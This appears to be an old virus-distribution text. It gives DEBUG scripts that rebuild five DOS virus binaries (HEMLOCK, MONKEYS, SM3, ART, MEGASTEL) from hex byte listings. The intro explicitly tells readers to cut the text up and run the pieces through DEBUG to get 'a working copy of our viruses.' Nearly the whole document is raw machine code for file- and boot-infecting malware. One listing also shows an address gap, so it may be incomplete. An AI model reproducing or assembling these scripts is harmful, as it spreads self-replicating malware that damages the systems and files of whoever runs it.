
  Debug Scripts!
  +------------+

  To get a working copy of our viruses, cut this article up, and rename
  the various sections according to the name of the file they will create
  but adding the extension .SCR.
  
  From there, to create the viruses go:  DEBUG < filename.SCR

  
  For example:
   below should become 'hemlock.scr'
   debug < hemlock.scr

  Simple!

+-------------------- Cut Here --------------------------------------+

 N HEMLOCK.COM
 E 0100 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
 E 0433 1A E8 E5 00 07 5F 58 AB 58 AB E9 D6 FD 0E 07 BA 23 04 D0 E8 40
 E 0448 95 B4 4F 72 6A 2B DB B4 62 E8 C8 00 85 DB 74 D8 8E DB 2B F6 3B
 E 045D 74 2C 74 CF 8E 5C 2C AC 84 C0 75 FB AC 84 C0 74 C2 0C 20 3C 70
 E 0472 75 F0 AD 0D 20 20 3D 61 74 75 08 AD 0C 20 3D 68 3D 74 0B 4E 4E
 E 0487 EB DB 1F 5E 58 84 C0 74 A0 2E 80 26 B7 03 FE 8B FA AC 3C 3B 74
 E 049C 07 84 C0 74 03 AA EB F4 50 56 1E 4F B0 5C AE 74 01 AA 57 B8 2A
 E 04B1 2E AB 98 AB B4 4E F8 5F 72 CE 0E 1F E8 4B 00 72 C7 57 BE A1 04
 E 04C6 B1 07 F3 A5 E9 89 FD 95 87 FA 8B 44 0E E8 15 00 03 44 10 13 D1
 E 04DB 2B C5 1B D7 F5 73 05 2D 87 04 1B D1 87 FA 95 C3 03 44 08 BA 10
 E 04F0 00 F7 EA C3 B4 3F BA E1 04 B9 04 00 EB 05 B9 23 04 8B D6 E8 16
 E 0505 00 72 02 2B C1 C3 B1 23 2A ED EB 0B 8B 54 18 2B C9 A9 8C C1 B8
 E 051A 00 42 9C FA 0E E8 FE FC C3 00 00 00 00 00 00 00 00 00 00 00 00
 E 052F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0544 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0559 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 056E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0583 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0598 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 05AD 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 05C2 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 05D7 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 05EC 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0601 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0616 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 062B 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0640 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0655 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 066A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 067F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0694 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 06A9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 06BE 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 06D3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 06E8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 06FD 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0712 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0727 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 073C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0751 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0766 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 077B 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0790 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 07A5 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 07BA 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 07CF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 07E4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 07F9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 080E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0823 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0838 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 084D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0862 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0877 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 088C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 08A1 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 08B6 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 08CB 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 08E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 08F5 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 090A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 091F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0934 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0949 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 095E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0973 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0988 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 099D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 09B2 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 09C7 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 09DC 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 RCX
 08EA
 W
 Q


+-------------------- Cut Here --------------------------------------+


 N MONKEYS.COM
 E 0100 4D BE 1E 02 B9 90 00 FD AD 50 E2 FC 54 58 05 14 00 50 FA C3 4C
 E 0115 4C 5D FB FC 8C 8E 80 00 BE 20 01 BF 00 01 03 F7 B9 20 01 F3 A4
 E 012A 51 8D 76 EC BF 00 02 8E 44 FE B9 20 01 F3 A4 8E D9 B8 5B 02 50
 E 013F B8 F9 EA 50 FF E4 4D 6F 6E 6B 65 79 73 20 6F 75 74 20 6F 66 20
 E 0154 43 6F 6E 74 72 6F 6C 72 02 EB FE BF 84 00 26 C4 1D 80 7D 02 20
 E 0169 74 11 89 9D 9C 02 8C 85 9E 02 C7 45 02 20 00 C7 05 96 00 A1 94
 E 017E 02 8E D8 8E C0 BC FC FF 33 C0 33 DB 99 33 ED 33 F6 33 FF EA 00
 E 0193 01 00 00 3D 00 4B 75 77 50 53 51 52 1E 06 B4 48 BB 12 00 CD 21
 E 01A8 72 62 50 50 B8 02 3D CD 21 92 1F 72 52 B4 45 33 DB CD 21 50 B4
 E 01BD 46 8B DA 33 C9 CD 21 50 B4 3E CD 21 5B B4 3F E8 4A 00 80 3F 4D
 E 01D2 74 28 B8 02 42 8B CB CD 21 2E A3 1E 00 B8 00 57 50 CD 21 51 52
 E 01E7 E8 2D 00 B8 00 42 8B CB CD 21 0E 1F E8 21 00 5A 59 58 40 CD 21
 E 01FC B4 46 5B 33 C9 CD 21 B4 3E CD 21 07 B4 49 CD 21 07 1F 5A 59 5B
 E 0211 58 2E FF 2E 20 01 B4 40 99 B9 20 01 CD 21 C3 CD 20 00 00
 RCX
 0124
 W
 Q

+-------------------- Cut Here --------------------------------------+


 N SM3.COM
 E 0100 E8 00 00 5E 83 EE 03 1E 33 C0 8E C0 BF 00 02 57 FC AF 5F 75 17
 E 0115 56 B9 07 01 2E F3 A4 BE 84 00 56 26 A5 26 A5 5F B8 4E 02 AB 91
 E 012A AB 5E 07 81 C6 4A 00 58 0B E4 50 0E 1F 75 07 BF 00 01 57 A5 A5
 E 013F C3 8C C0 05 10 00 01 44 02 FF 2C CD 20 00 00 3D 00 4B 74 03 E9
 E 0154 77 00 50 53 51 52 56 57 1E 06 B8 02 3D CD 21 72 60 0E 1F 0E 07
 E 0169 93 B4 3F B9 18 00 BA 0B 03 CD 21 33 C8 75 49 89 D6 50 B0 19 38
 E 017E 44 03 74 3E 38 44 12 74 39 B8 02 42 99 CD 21 50 BF 4A 02 80 3C
 E 0193 4D 74 3C 56 A5 A5 5F B0 E9 AA 58 48 48 48 AB C6 05 19 B4 40 B9
 E 01A8 07 01 BA 00 02 CD 21 B8 00 42 99 33 C9 CD 21 59 B4 40 BA 0B 03
 E 01BD CD 21 50 58 B4 3E CD 21 07 1F 5F 5E 5A 59 5B 58 2E FF 2E 07 03
 E 01D2 52 56 BE 1F 03 A5 A5 05 07 01 83 D2 00 B9 00 02 F7 F1 5F AF AF
 E 01E7 FD 0B D2 74 01 40 AB 92 AB 5A 58 B9 10 00 F7 F1 2B 06 13 03 BF
 E 01FC 21 03 AB 92 AB B8 19 00 AB EB 9E
 RCX
 0107
 W
 Q

+-------------------- Cut Here --------------------------------------+


 N ART.COM
 E 0100 2E C6 06 D8 07 00 2E 89 26 E0 07 2E 8C 16 DE 07 2E C6 06 FD 07
 E 0115 30 B8 01 35 CD 21 2E 89 1E 02 08 2E 8C 06 04 08 B4 52 CD 21 26
 E 012A 8B 47 FE 2E A3 D8 07 99 8E DA B8 60 01 A3 04 00 8C 0E 06 00 8C
 E 013F C8 8E D0 BC 34 08 B8 00 03 50 9D B4 30 CD 21 3C 02 7C 00 B8 00
 E 0154 4C 2E 83 3E CD 07 FF 75 01 40 CD 21 2E 8F 06 EA 07 2E 8F 06 E8
 E 0169 07 2E 8F 06 12 08 2E 89 26 E4 07 2E C7 06 DC 07 7E 01 E9 59 04
 E 017E 2E F6 06 D8 07 10 74 18 2E 8E 06 EE 07 2E 80 26 D8 07 EF 2E 8E
 E 0193 1E E8 07 2E 8B 36 E6 07 C6 04 36 B8 34 08 2E 2B 06 E4 07 74 27
 E 01A8 72 1E 8B C8 2E 29 06 E0 07 2B E0 FC 8C C8 8E D8 2E 8B 36 E4 07
 E 01BD 2E 8E 06 DE 07 8B FC F3 A4 EB 07 2E 29 06 E0 07 2B E0 2E 8E 1E
 E 01D2 E8 07 2E 8B 36 EA 07 2E F6 06 D8 07 04 74 0D 8B EC 81 66 04 FF
 E 01E7 FE 2E 80 26 D8 07 FB 2E 80 26 D8 07 FE FC 2E 89 36 EA 07 2E 8C
 E 01FC 1E E8 07 2E F6 06 D8 07 08 75 2B 2E A1 D8 07 2E 39 06 E8 07 73
 E 0211 20 2E 8C 1E CD 07 2E 89 36 CB 07 33 C9 2E C7 06 DC 07 28 02 E9
 E 0226 AF 03 2E 81 26 12 08 FF FE E9 B7 02 8C C8 8E C0 BF 06 08 AD 33
 E 023B C9 3C 0E 75 08 04 10 2E 80 0E D8 07 01 3C 26 75 21 3C 36 75 11
 E 0250 2E 80 0E D8 07 20 4E 4E 2E 89 36 E6 07 46 46 EB 06 2E 80 26 D8
 E 0265 07 DF AA AC 86 E0 EB CF 3C 2E 75 0A 2E 80 0E D8 07 01 0C 10 EB
 E 027A D1 3C 36 74 CD 3C 3E 75 08 2E 80 26 D8 07 FE EB C1 3C 8C 75 28
 E 028F AA 86 E0 8B D8 24 38 3C 08 75 09 80 CB 10 2E 80 0E D8 07 01 2E
 E 02A4 C7 06 DC 07 71 06 E9 84 03 2E C7 06 DC 07 71 06 E9 7A 03 3C 9C
 E 02B9 75 1C 2E FF 36 12 08 2E 89 26 E0 07 4E 2E F6 06 D8 07 02 75 06
 E 02CE 5B 81 E3 FF FE 53 E9 17 FF 3C 9D 75 27 58 2E A3 12 08 4E A9 00
 E 02E3 01 74 08 2E 80 0E D8 07 02 EB 06 2E 80 26 D8 07 FD 2E 81 26 12
 E 02F8 08 FF FE 2E 89 26 E0 07 EB D2 3C C2 75 05 B9 02 00 EB 25 3C C3
 E 030D 74 F7 3C CA 75 05 83 C1 04 EB 18 3C CB 74 F7 3C CF 75 16 8B EC
 E 0322 81 4E 04 00 01 2E 80 26 D8 07 F7 B9 06 00 E9 49 01 E9 9E 00 3C
 E 0337 C8 75 05 AB A5 E9 32 03 3C CC 74 1B 3C CE 75 13 2E F7 06 12 08
 E 034C 00 08 75 0E E9 15 FF 2E FF 36 EA 07 EB 15 3C CD 75 42 2E 80 0E
 E 0361 D8 07 04 2E FF 36 12 08 1E 84 E4 74 E5 56 2E 89 26 E0 07 2E A3
 E 0376 DA 07 33 C0 8E D8 2E A1 DA 07 86 E0 32 E4 D1 E0 D1 E0 8B F0 AD
 E 038B 2E A3 EA 07 AD 2E A3 E8 07 2E 81 26 12 08 FF FC E9 31 FE EB 90
 E 03A0 3D D4 00 74 66 3C F0 75 03 E9 A0 FE 3C F2 74 F9 3C F3 74 F5 3C
 E 03B5 F6 74 49 3C F7 74 45 3C FF 74 57 3C 40 72 06 3C 61 77 02 EB 1A
 E 03CA 3C 80 72 06 3C 8F 77 02 EB 62 8B EF BF 30 07 BA E2 03 B9 2F 00
 E 03DF E9 46 02 E3 05 AA 4E E9 88 02 83 C2 10 B9 18 00 E9 36 02 E3 04
 E 03F4 AB E9 79 02 83 C2 12 B9 1A 00 E9 27 02 E9 96 00 E3 08 AB A4 E9
 E 0409 66 02 E9 2A 01 83 C2 30 B9 30 00 E9 11 02 E9 92 00 2E 80 0E D8
 E 041E 07 80 2E 80 0E D8 07 40 2E C7 06 DC 07 71 06 86 E0 8B D8 E9 FD
 E 0433 01 E3 2B AA 3C 69 74 DF 3C 6B 74 E1 3C 80 74 DD 3C 81 74 D3 3C
 E 0448 82 74 D5 3C 83 74 CB 3C C0 74 CD 3C C1 74 C3 3C C6 74 C5 3C C7
 E 045D 74 BB EB C5 83 C2 36 B9 06 00 E9 BE 01 E3 0A 2E C7 06 CD 07 FF
 E 0472 FF E9 B2 FD 2E 80 26 D8 07 FE 8C C8 8E C0 BF 34 08 2E 8E 1E DE
 E 0487 07 2E 8B 36 E0 07 FC F3 A4 2E C7 06 DC 07 D7 04 E9 3D 01 8B D8
 E 049C 86 E0 24 38 3C 30 74 55 3C 38 74 51 93 E9 28 FF AA 86 E0 8B D8
 E 04B1 24 38 3C 10 72 04 3C 28 76 04 93 E9 78 FF 2E F6 06 D8 07 20 74
 E 04C6 B5 2E 80 36 D8 07 30 2E 8B 36 E6 07 80 2C 10 EB A5 8C C8 8E D0
 E 04DB BC 34 08 2E A1 FC 07 2E 81 0E 12 08 00 01 2E FF 36 12 08 2E FF
 E 04F0 36 E8 07 2E FF 36 EA 07 CF 81 EF 06 08 2E 89 3E E2 07 81 C7 06
 E 0505 08 93 A8 01 75 04 B0 80 EB 02 B0 83 AA 86 E0 0C 38 8B D8 2E C7
 E 051A 06 DC 07 22 05 E9 0F 01 32 C0 AA 2E C7 06 DA 07 36 05 4E 4E 2E
 E 052F 2B 36 E2 07 E9 42 01 75 3D 2E A1 12 08 2E F6 06 D8 07 02 75 03
 E 0544 25 FF FE 50 25 FF FD 2E A3 12 08 2E FF 36 E8 07 2E FF 36 EA 07
 E 0559 2E 89 26 E0 07 33 C0 8E D8 A1 00 00 8B F0 A1 02 00 8E D8 2E 80
 E 056E 0E D8 07 08 E9 79 FC 8C C8 8E C0 BF 06 08 2E 03 3E E2 07 2E 8B
 E 0583 36 EA 07 2E 03 36 E2 07 2E 89 36 EA 07 2E 8E 1E E8 07 AD E9 3B
 E 0598 FE 2E 8C 1E EC 07 2E 8C 16 DE 07 2E 89 26 E0 07 8C CC 8E D4 BC
 E 05AD FE 07 50 53 51 52 56 57 55 06 8C C8 8E D0 BC 34 08 9C 2E 8F 06
 E 05C2 12 08 2E A1 FC 07 2E 8E 16 DE 07 2E 8B 26 E0 07 2E FF 26 DC 07
 E 05D7 8C CC 8E D4 BC EC 07 1F 07 5D 5F 5E 5A 59 5B 58 BD FC 05 2E F6
 E 05EC 06 D8 07 10 74 1E BD F7 05 EB 19 2E 8E 06 DE 07 2E 8B 2E F0 07
 E 0601 2E 8E 16 DE 07 2E 8B 26 E0 07 2E FF 26 DC 07 8C C8 8E D0 BC 12
 E 0616 08 58 2E 8B 26 E4 07 25 FF FE 50 9D 2E A1 FC 07 FF E5 FC F2 AE
 E 062B E3 02 8B FD FF E2 8A C3 24 C7 3C 40 73 24 3C 06 74 28 8A C3 AA
 E 0640 2E F6 06 D8 07 C0 74 10 2E F6 06 D8 07 80 74 01 A4 A4 2E 80 26
 E 0655 D8 07 3F 2E FF 26 DC 07 3C C0 73 DC 3C 80 72 06 8A C3 AA A5 EB
 E 066A D5 8A C3 AA A4 EB CF 2E C7 06 DA 07 D8 06 97 2E 8C 1E E8 07 2E
 E 067F 89 36 EA 07 8C CF 8E DF 33 FF 8E C7 83 C7 04 BE 02 08 A5 A5 8C
 E 0694 CF 8E C7 97 B8 2E FF AB B8 26 DC AB B0 07 AA 2E F6 06 D8 07 01
 E 06A9 74 0A 2E C7 06 DC 07 BF 06 E9 22 FF 2E C7 06 DC 07 C9 06 E9 18
 E 06BE FF 2E A1 E8 07 8E D8 2E A1 FC 07 2E C7 06 DC 07 D3 06 E9 33 01
 E 06D3 2E FF 26 DA 07 2E C7 06 DC 07 E2 06 E9 BC FE 8C D8 8C CB 3B C3
 E 06E8 75 05 2E 8E 1E EC 07 2E 8C 1E EC 07 8C C8 8E C0 BF 60 01 B8 2E
 E 06FD 8F AB B8 06 EA AB B8 07 2E AB 33 C0 8E D8 8E C0 BF 04 00 8B F7
 E 0712 AD 2E A3 02 08 AD 2E A3 04 08 B8 60 01 AB 8C C8 AB 2E 8E 1E E8
 E 0727 07 2E 8B 36 EA 07 E9 BE FA 06 07 0E 16 17 1E 1F 27 2F 37 3F 6C
 E 073C 6D 6E 6F 90 91 92 93 94 95 96 97 98 99 9B 9E 9F A4 A5 A6 A7 AA
 E 0751 AB AC AD AE AF C9 D7 F5 F8 F9 FA FB FC FD 04 0C 14 1C 24 2C 34
 E 0766 3C 6A A8 B0 B1 B2 B3 B4 B5 B6 B7 D4 D5 E4 E6 E5 E7 05 0D 15 1D
 E 077B 25 2D 35 3D 45 4D 55 5D 68 A0 A1 A2 A3 A9 B8 B9 BA BB BC BD BE
 E 0790 BF 00 01 02 03 08 09 0A 0B 10 11 12 13 18 19 1A 1B 20 21 22 23
 E 07A5 28 29 2A 2B 30 31 32 33 38 39 3A 3B 69 6A C0 C1 C4 C5 C6 C7 D0
 E 07BA D1 D2 D3 D4 F6 F7 FE 0F 63 66 67 D6 F1 00 00 9C 9A 00 00 00 00
 E 07CF C3 9C 9A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 07E4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 07F9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 080E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0823 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0838 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 084D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0862 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0877 00 00 00 00 00 00 00 00 00 00 00 00 00
 RCX
 0784
 W
 Q


+-------------------- Cut Here --------------------------------------+


 N MEGASTEL.COM
 E 0100 FC 8C C8 0B C0 74 1E E9 84 00 5B 4D 65 67 61 53 74 65 61 6C 74
 E 0115 68 5D 20 62 79 20 71 61 72 6B 2F 56 4C 41 44 00 33 C0 BE 00 7C
 E 012A FA 8E D0 8B E6 FB 8E C0 8E D8 83 2E 13 04 02 CD 12 B1 06 D3 E0
 E 013F 8E C0 B8 02 02 33 DB 32 F6 B9 02 00 0A D2 78 05 B9 00 00 B6 00
 E 0154 CD 13 BE 4C 00 BF 64 02 A5 A5 C7 44 FC 68 02 8C 44 FE 26 C6 06
 E 0169 12 02 00 B0 02 B1 21 D2 E8 A8 01 74 16 BE D8 01 BF 4A 03 A5 A5
 E 017E C7 44 FC 4E 03 8C 44 FE 26 C6 06 B0 03 00 CD 19 BE 00 01 B8 01
 E 0193 F0 CD 13 3D F0 10 74 65 8C D8 48 8E D8 80 3E 00 00 5A 75 59 83
 E 01A8 2E 03 00 7D 83 2E 12 00 7D A1 12 00 0E 1F 8E C0 33 FF 56 B9 00
 E 01BD 04 F3 A4 33 C0 8E D8 BE 4C 00 BF 64 02 A5 A5 C7 44 FC 68 02 8C
 E 01D2 44 FE 5B 53 81 C3 B1 03 06 0E 07 B8 01 02 B9 01 00 BA 80 00 CD
 E 01E7 13 07 BE 84 00 BF 41 01 A5 A5 C7 44 FC 17 01 8C 44 FE 26 C6 06
 E 01FC 12 02 01 5E 0E 1F 0E 07 81 C6 0F 01 BF 00 01 57 A5 A5 C3 CD 20
 E 0211 00 00 E9 00 00 56 50 06 B8 00 B8 8E C0 26 C7 06 54 01 AF AF 07
 E 0226 58 50 86 E0 3C 3D 74 1A 3C 4B 74 16 3C 43 74 12 3C 56 74 0E 3D
 E 023B 6C 00 74 09 58 EA 00 00 00 00 E9 A9 00 53 51 52 56 57 1E 06 3C
 E 0250 6C 75 02 89 F2 89 D6 FC AC 3C 2E 75 FB AD 0D 20 20 3D 63 6F 75
 E 0265 DF AC 0C 20 3C 6D 75 D8 B8 02 3D E8 98 00 72 D0 93 B4 3F B9 04
 E 027A 00 0E 1F BA 0F 01 E8 88 00 A1 0F 01 3C E9 75 0A A0 12 01 3C 56
 E 028F 74 5B E9 0D 00 0D 20 20 3D 7A 6D 74 50 3D 6D 7A 74 4B E8 5C 00
 E 02A4 0B D2 75 44 3D 0C F8 77 3F 3D E8 03 72 3A 50 05 00 01 A3 8F 00
 E 02B9 58 2D 03 00 A3 14 01 B8 00 57 E8 45 00 72 24 51 52 B4 40 B9 B1
 E 02CE 03 33 D2 E8 37 00 72 0E E8 23 00 B4 40 B9 04 00 BA 13 01 E8 27
 E 02E3 00 5A 59 B8 01 57 E8 1F 00 B4 3E E8 1A 00 07 1F 5F 5E 5A 59 5B
 E 02F8 58 E9 44 FF B0 00 EB 02 B0 02 33 C9 99 B4 42 E8 01 00 C3 9C 2E
 E 030D FF 1E 41 01 C3 00 B9 04 00 B8 01 02 0A D2 78 04 B1 0E B6 01 E8
 E 0322 18 01 E9 03 01 86 C4 CF 2E 80 3E 12 02 01 74 31 26 81 3F 4D 5A
 E 0337 75 2A 56 57 1E 06 33 F6 8E DE 0E 07 BE 84 00 BF 41 01 A5 A5 C7
 E 034C 44 FC 17 01 8C 44 FE 2E C6 06 12 02 01 07 1F 5F 5E E9 03 00 CA
 E 0361 02 00 EA 00 00 00 00 3D 01 F0 74 BA 80 FC 02 75 B8 83 F9 01 75
 E 0376 B3 0A F6 75 AF E8 BE 00 72 E0 9C 50 53 51 52 56 57 1E 06 26 81
 E 038B 7F 0A 5B 4D 74 82 2E C6 06 B0 03 01 B9 04 00 0A D2 78 3E 52 0E
 E 03A0 1F 26 8B 47 18 26 29 47 13 26 8B 47 13 26 8B 4F 18 33 D2 F7 F1
 E 03B5 33 D2 26 8B 4F 1A F7 F1 50 86 C4 B1 06 D2 E0 0C 01 A3 50 00 58
 E 03CA 26 8B 4F 1A 33 D2 F7 F1 88 16 53 00 B9 0E 00 5A B6 01 B8 01 03
 E 03DF E8 5A 00 72 46 06 1F 89 DE 0E 07 B9 FE 01 FC BF B1 03 F3 A4 B8
 E 03F4 55 AA AB 0E 1F 33 F6 BF B1 03 B9 8E 00 F3 A4 BB B1 03 B8 01 03
 E 0409 B9 01 00 32 F6 E8 2B 00 72 17 B8 02 03 B9 02 00 33 DB 0A D2 78
 E 041E 08 8B 0E 50 00 8A 36 53 00 E8 12 00 2E C6 06 B0 03 00 07 1F 5F
 E 0433 5E 5A 59 5B 58 9D E9 24 FF 9C 0E E8 22 FF C3 07 1F 5F 5A 59 5B
 E 0448 58 EA 00 00 00 00 2E 80 3E B0 03 01 74 F3 50 53 51 52 57 1E 06
 E 045D BA F3 01 EC 3C 01 75 DD 42 EC 3C 00 75 D7 42 EC 3C 00 75 D1 42
 E 0472 EC 24 0F 3C 00 75 C9 42 EC A8 0F 75 02 EB C1 FC BA F0 01 0E 07
 E 0487 BF B1 03 B9 00 01 F3 6D BA F2 01 B0 01 EE 42 B0 04 EE B0 00 42
 E 049C EE 42 EE 42 B0 A0 EE BA F7 01 B0 20 EE EC A8 08 74 FB EB 92 00
 RCX
 03B1
 W
 Q

+-------------------- Cut Here --------------------------------------+

